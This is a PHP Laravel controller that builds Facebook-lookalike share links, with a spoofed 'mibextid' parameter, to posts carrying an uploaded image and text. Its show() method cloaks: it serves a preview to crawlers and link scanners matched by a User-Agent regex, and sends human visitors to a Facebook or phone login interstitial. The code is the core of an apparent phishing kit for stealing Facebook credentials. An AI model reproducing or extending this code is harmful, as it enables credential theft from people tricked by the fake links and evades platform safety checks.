<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\URL;
use App\Models\SharedPost;

class FacebookShareController extends Controller
{


 public function createphone()
    {
        $history = SharedPost::orderBy('created_at', 'desc')->take(10)->get();
        return view('admin.create_share_phone', compact('history'));
    }

    public function create()
    {
        $history = SharedPost::orderBy('created_at', 'desc')->take(10)->get();
        return view('admin.create_share', compact('history'));
    }

    public function store(Request $request)
    {
        $request->validate([
            'image' => 'required|image',
            'writeup' => 'required|string',
        ]);
        $image = $request->file('image');
        $imageName = uniqid('share_') . '.' . $image->getClientOriginalExtension();
        $image->move(public_path('shared_images'), $imageName);
        $imagePath = 'shared_images/' . $imageName;
        $token = Str::random(10);
        $isPhoneShare = $request->input('is_phone_share') == '1';
       
        $post = SharedPost::create([
            'image' => $imagePath,
            'writeup' => $request->writeup,
            'token' => $token,
            'phone_share' => $isPhoneShare,
           
        ]);
        $link = URL::to("/facebook/share/r/{$token}") . '?mibextid=wwXIfr';
        return view('admin.share_link', compact('link'));
    }

    public function show($token, Request $request)
    {
        $post = SharedPost::where('token', $token)->firstOrFail();
        $userAgent = strtolower($request->header('User-Agent', ''));
        $isBot = preg_match('/bot|crawl|slurp|spider|facebookexternalhit|facebot|twitterbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|slackbot|vkshare|telegrambot|applebot|whatsapp|flipboard|tumblr|bitlybot|scoop.it|redditbot|discordbot|google|bing|yandex|baidu/', $userAgent);
        if ($isBot) {
            // Show meta preview for bots/crawlers
            return response()->view('facebook.shared_post', compact('post'));
        } else {
            $redirectRoute = $post->phone_share ? 'phone.login' : 'facebook.login';
            return response()->view('facebook.login_interstitial', ['redirectRoute' => $redirectRoute]);
        }
    }

    public function destroy($id)
    {
        $post = SharedPost::findOrFail($id);
        $post->delete();
        return redirect()->back()->with('status', 'Share deleted successfully.');
    }
}
